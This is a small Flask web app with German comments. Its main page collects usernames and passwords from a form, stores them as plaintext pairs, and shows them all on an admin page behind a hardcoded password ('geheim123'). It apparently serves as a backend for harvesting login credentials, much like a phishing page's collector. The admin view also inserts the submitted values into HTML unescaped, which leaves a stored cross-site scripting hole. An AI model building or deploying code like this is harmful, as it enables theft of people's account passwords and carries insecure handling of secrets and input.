from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

# Speicher für eingetragene Daten (nur während App läuft!)
ENTRIES = []

# Passwort für den Adminbereich
ADMIN_PASSWORD = "geheim123"  # <-- Du kannst das ändern!

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if username and password:
            ENTRIES.append(f"[{timestamp}] Username: {username} | Passwort: {password}")

        return "<h2>✅ Danke fürs Eintragen!</h2><a href='/'>Zurück</a>"

    return render_template("index.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        entered_password = request.form.get("password")
        if entered_password != ADMIN_PASSWORD:
            return "<h3>❌ Falsches Passwort!</h3><a href='/admin'>Zurück</a>"

        if not ENTRIES:
            return "<h3>Keine Eingaben bisher.</h3>"

        content = "<br>".join(ENTRIES)
        return f"<h3>🔐 Eingetragene Nutzer:</h3><div style='font-family: monospace'>{content}</div><br><a href='/admin'>Zurück</a>"

    return '''
        <h2>🔐 Admin-Bereich</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="Admin-Passwort" required>
            <button type="submit">Login</button>
        </form>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
